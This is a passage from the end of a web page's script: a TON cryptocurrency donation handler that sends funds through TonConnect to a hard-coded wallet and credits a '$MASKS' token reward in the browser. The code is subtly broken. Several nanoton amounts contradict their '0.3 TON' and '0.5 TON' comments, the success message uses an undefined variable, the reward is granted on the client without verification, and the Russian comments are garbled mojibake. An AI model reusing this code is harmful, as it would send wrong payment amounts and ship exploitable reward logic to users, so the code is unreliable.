                    switch (amount) {
                        case '0.3':
                            nanocoinsAmount = '30000'; // 0.3 TON
                            rewardValue = 0.000147; // $MASKS –∑–∞ 0.3 TON
                            break;
                        case '0.5':
                            nanocoinsAmount = '5000000'; // 0.5 TON
                            rewardValue = 0.000399; // $MASKS –∑–∞ 0.5 TON
                            break;
                        case '1':
                            nanocoinsAmount = '10000000'; // 1 TON
                            rewardValue = 0.000950; // $MASKS –∑–∞ 1 TON
                            break;
                        case '5':
                            nanocoinsAmount = '50000000'; // 5 TON
                            rewardValue = 0.0021; // $MASKS –∑–∞ 5 TON
                            break;
                        default:
                            alert('Invalid donation amount');
                            return;
                    }

                    try {
                        const tx = await tonConnectUI.sendTransaction({
                            validUntil: Math.floor(Date.now() / 1000) + 600, // –í—Ä–µ–º—è –∂–∏–∑–Ω–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (10 –º–∏–Ω—É—Ç)
                            messages: [
                                {
                                    address: 'UQASUrYVEDVBoioJjG5_af9nE4VzBQwlyxOWix0OWlNFlLia', // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞
                                    amount: nanocoinsAmount,
                                    payload: '',
                                }
                            ]
                        });

                        // –ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –Ω–∞—á–∏—Å–ª—è–µ–º $MASKS
                        addMasksToBalance(rewardValue);
                        alert(`Donation of ${amount} TON sent successfully! You received ${reward} $MASKS.`);
                    } catch (error) {
                        alert('Error sending donation: ' + error.message);
                    }
                };
            });



        }




        

    </script>
</body>
</html>
